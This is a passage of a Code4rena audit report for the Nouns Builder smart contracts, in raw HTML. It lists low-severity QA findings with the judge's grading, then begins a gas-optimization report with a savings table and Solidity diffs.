href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/428\">_Adam</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/15\">ballx</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/220\">CRYP70</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/55\">dharma09</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/444\">dic0de</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/115\">Lead_Belly</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/200\">martin</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/98\">minhtrng</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/197\">Picodes</a>, and <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/687\">Randyyy</a>.</em></p>\n<h2 id=\"01\" style=\"position:relative;\"><a href=\"#01\" aria-label=\"01 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[01]</h2>\n<p>In <code>Token</code>, when a founder has <code>wallet</code> set to <code>address(0)</code>, he will not receive any tokens (which is good), but he is still included in all of the calculations such as <code>numFounders</code> or <code>totalOwnership</code>, meaning that they will be wrong in such situations.</p>\n<h2 id=\"02\" style=\"position:relative;\"><a href=\"#02\" aria-label=\"02 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[02]</h2>\n<p>In <code>Token</code>, <code>totalFounderOwnership()</code> does not incorparate the vesting period. It is just the total percent ownership that the founders received at one point in time, but this metric is pretty useless without incorporating the timespan (as 100% for 1 week is very different to 10% for 10 years).</p>\n<h2 id=\"03\" style=\"position:relative;\"><a href=\"#03\" aria-label=\"03 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[03]</h2>\n<p>In <code>MetadataRenderer._getItemImage</code>, a dot is missing between the item name and extension (<a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/debe9b792cc70510eadf9b3728cde5b0f2ec9a1f/src/token/metadata/MetadataRenderer.sol#L259\">MetadataRenderer.sol#L259</a>).</p>\n<h2 id=\"04\" style=\"position:relative;\"><a href=\"#04\" aria-label=\"04 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[04]</h2>\n<p><code>MetadataRenderer.addProperties</code> seems to be very error-prone to me. When an item is added for a new property, <code>isNewProperty</code> needs to be set and you need to keep in mind that the property ID refers to the ID of the newly added property, not the global ID that the property will get.</p>\n<h2 id=\"05\" style=\"position:relative;\"><a href=\"#05\" aria-label=\"05 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[05]</h2>\n<p>In <code>Auction._handleOutgoingTransfer</code>, it is not checked if the WETH transfer succeeds (when WETH is used). The commonly used WETH implementation will revert on failure, but this is no requirement of EIP-20, so using another WETH implementation could lead to a problem there.</p>\n<h2 id=\"06\" style=\"position:relative;\"><a href=\"#06\" aria-label=\"06 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[06]</h2>\n<p><code>Treasury.isExpired</code> returns true for non-existing proposals, which could lead to wrong states for third-party applications that use this function. Consider reverting for non-existing proposals.</p>\n<h2 id=\"07\" style=\"position:relative;\"><a href=\"#07\" aria-label=\"07 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[07]</h2>\n<p>If the <code>Governor</code> contract would ever contain ETH (e.g, after a <code>selfdestruct</code> of some other contract), it could not be retrieved, as the <code>execute</code> function can only forward the received ETH, but not use its own.</p>\n<h2 id=\"08\" style=\"position:relative;\"><a href=\"#08\" aria-label=\"08 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[08]</h2>\n<p>Even after a vetoer is burned, the owner can still update it. This can reduce the confidence in the system, as the owner always has complete veto control. Consider making the burning operation final.</p>\n<h2 id=\"09\" style=\"position:relative;\"><a href=\"#09\" aria-label=\"09 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[09]</h2>\n<p><code>Auction</code> can only be paused / unpaused after a vote with the corresponding delays. This can be too slow in certain scenarios (e.g., emergency response after a security incident). Consider introducing an optional emergency pause feature (e.g., by the founder).</p>\n<h2 id=\"10\" style=\"position:relative;\"><a href=\"#10\" aria-label=\"10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[10]</h2>\n<p>It is still possible to bid when an Auction is paused. This can have negative consequences, for instance when the bidding process contains a security vulnerability and the system is temporarily paused for mitigation.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/104#issuecomment-1258845787\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p><strong>In Token, when a founder has wallet set to address(0), he will not receive any tokens (which is good), but he is still included in all of the calculations such as numFounders or totalOwnership, meaning that they will be wrong in such situations.</strong><br>\nLow</p>\n<p><strong>In Token, totalFounderOwnership()</strong><br>\nRefactoring</p>\n<p><strong>In MetadataRenderer._getItemImage</strong><br>\nAlso don’t get it, code compiles</p>\n<p><strong>MetadataRenderer.addProperties</strong><br>\nRefactoring</p>\n<p><strong>Treasury.isExpired</strong><br>\nNon-critical</p>\n<p><strong>If the Governor</strong><br>\nLow</p>\n<p><strong>Even after a vetoer is burned</strong><br>\nDisagree as it has to be voted back in</p>\n<p><strong>Auction can only be paused</strong><br>\nRefactoring</p>\n<p><strong>It is still possible to bid when an Auction is paused</strong><br>\nDisagree as it keeps it fair for people in the auction</p>\n<p>2L 3R</p>\n<p>All in all a custom report + well done performance overall, fairly won, gratz!</p>\n</blockquote>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this contest, 75 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/133\">report highlighted below</a> by <strong>pfapostol</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/532\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/343\">volky</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/276\">0xA5DF</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/236\">Migue</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/429\">_Adam</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/243\">LeoS</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/382\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/655\">c3phas</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/71\">SnowMan</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/49\">gogo</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/447\">__141345__</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/363\">MiloTruck</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/102\">Saintcode_</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/125\">ReyAdmirado</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/336\">JAGADESH</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/210\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/56\">oyc_109</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/223\">0x1f8b</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/289\">DimSon</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/302\">CertoraInc</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/466\">WatchDogs</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/696\">rfa</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/512\">TomJ</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/19\">CodingNameKiki</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/48\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/87\">JC</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/164\">Matin</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/199\">martin</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/480\">Waze</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/587\">leosathya</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/683\">Deivitto</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/718\">brgltd</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/642\">tofunmi</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/33\">Tomo</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/140\">R2</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/473\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/14\">ballx</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/38\">Bnke0x0</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/105\">Lambda</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/212\">gianganhnguyen</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/249\">bulej93</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/260\">ch0bu</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/328\">PPrieditis</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/383\">Respx</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/396\">simon135</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/502\">ret2basic</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/515\">wagmi</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/585\">asutorufos</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/619\">djxploit</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/709\">pauliax</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/118\">Tointer</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/530\">prasantgupta52</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/665\">lucacez</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/30\">StevenL</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/58\">dharma09</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/61\">robee</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/63\">durianSausage</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/120\">Cr4ckM3</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/156\">fatherOfBlocks</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/172\">sikorico</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/213\">Metatron</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/216\">0xkatana</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/217\">Chandr</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/257\">Samatak</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/316\">imare</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/331\">0x4non</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/353\">0xc0ffEE</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/415\">Franfran</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/437\">PaludoX0</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/446\">zishansami</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/489\">0x5rings</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/548\">easy_peasy</a>, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/648\">peiw</a>, and <a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/661\">ajtra</a>.</em></p>\n<h2 id=\"summary-1\" style=\"position:relative;\"><a href=\"#summary-1\" aria-label=\"summary 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h2>\n<p>Gas savings are estimated using the gas report of existing <code>forge test --gas-report</code> tests (the sum of all deployment costs and the sum of the costs of calling all methods) and may vary depending on the implementation of the fix. I keep my version of the fix for each finding and can provide them if you need them.<br>\nIn this project, the optimizer is set on 500000 runs, so some of the common optimizations are useless or partially useless. Only cases that save gas with this configuration of optimizer are included in the report.</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\"></th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n<th align=\"center\">Estimated gas(deployments)</th>\n<th align=\"center\">Estimated gas(method call)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align=\"center\"><strong>G‑01</strong></td>\n<td align=\"left\"><code>storage</code> pointer to a structure is cheaper than copying each value of the structure into <code>memory</code>, same for <code>array</code> and <code>mapping</code></td>\n<td align=\"center\">5</td>\n<td align=\"center\">168 820</td>\n<td align=\"center\">1 672</td>\n</tr>\n<tr>\n<td align=\"center\"><strong>G‑02</strong></td>\n<td align=\"left\">State variables can be packed into fewer storage slots</td>\n<td align=\"center\">1</td>\n<td align=\"center\">99 511</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td align=\"center\"><strong>G‑03</strong></td>\n<td align=\"left\">State variables should be cached in stack variables rather than re-reading them from storage</td>\n<td align=\"center\">5</td>\n<td align=\"center\">70 505</td>\n<td align=\"center\">2 634</td>\n</tr>\n<tr>\n<td align=\"center\"><strong>G‑04</strong></td>\n<td align=\"left\">Using bools for storage incurs overhead</td>\n<td align=\"center\">5</td>\n<td align=\"center\">60 668</td>\n<td align=\"center\">1 191</td>\n</tr>\n<tr>\n<td align=\"center\"><strong>G‑05</strong></td>\n<td align=\"left\">Storage variable is used when local exists</td>\n<td align=\"center\">2</td>\n<td align=\"center\">1 400</td>\n<td align=\"center\">2 602</td>\n</tr>\n<tr>\n<td align=\"center\"><strong>G‑06</strong></td>\n<td align=\"left\">Use named returns where appropriate</td>\n<td align=\"center\">3</td>\n<td align=\"center\">2 000</td>\n<td align=\"center\">174</td>\n</tr>\n<tr>\n<td align=\"center\"><strong>-</strong></td>\n<td align=\"left\">Overall Gas Saved</td>\n<td align=\"center\">21</td>\n<td align=\"center\">341 027</td>\n<td align=\"center\">10 231</td>\n</tr>\n</tbody>\n</table>\n<p><strong>Total: 21 instances over 6 issues</strong></p>\n<hr>\n<h2 id=\"g-01-storage-pointer-to-a-structure-is-cheaper-than-copying-each-value-of-the-structure-into-memory-same-for-array-and-mapping-5-instances\" style=\"position:relative;\"><a href=\"#g-01-storage-pointer-to-a-structure-is-cheaper-than-copying-each-value-of-the-structure-into-memory-same-for-array-and-mapping-5-instances\" aria-label=\"g 01 storage pointer to a structure is cheaper than copying each value of the structure into memory same for array and mapping 5 instances permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-01] <code>storage</code> pointer to a structure is cheaper than copying each value of the structure into <code>memory</code>, same for <code>array</code> and <code>mapping</code> (5 instances)</h2>\n<p>Deployment Gas Saved: <strong>168 820</strong><br>\nMethod Call Gas Saved: <strong>1 672</strong><br>\n<code>forge snapshot --diff</code>: <strong>8 746</strong> Gas Saved</p>\n<p>It may not be obvious, but every time you copy a storage <code>struct</code>/<code>array</code>/<code>mapping</code> to a <code>memory</code> variable, you are copying each member by reading it from <code>storage</code>, which is expensive. And when you use the <code>storage</code> keyword, you are just storing a pointer to the storage, which is much cheaper.\nException: case when you need to read all or many members multiple times. In report included only cases that saved gas</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol\">src/auction/Auction.sol</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"78\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/auction/Auction.sol b/src/auction/Auction.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 794da99..92854f6 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/auction/Auction.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/auction/Auction.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -89,7 +89,7 @@ contract Auction is IAuction, UUPS, Ownable, ReentrancyGuard, Pausable, AuctionS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    89,  89:     /// @param _tokenId The ERC-721 token id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    90,  90:     function createBid(uint256 _tokenId) external payable nonReentrant {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    91,  91:         // Get a copy of the current auction</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-  92     :-        Auction memory _auction = auction;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       92:+        Auction storage _auction = auction;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    93,  93:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    94,  94:         // Ensure the bid is for the current token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    95,  95:         if (_auction.tokenId != _tokenId) revert INVALID_TOKEN_ID();</span></span></span></code></pre>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol\">src/governance/governor/Governor.sol</a></li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"79\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/governance/governor/Governor.sol b/src/governance/governor/Governor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 0d963c5..ca5600a 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/governance/governor/Governor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/governance/governor/Governor.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -355,7 +355,7 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    355, 355:         if (state(_proposalId) == ProposalState.Executed) revert PROPOSAL_ALREADY_EXECUTED();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    356, 356:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    357, 357:         // Get a copy of the 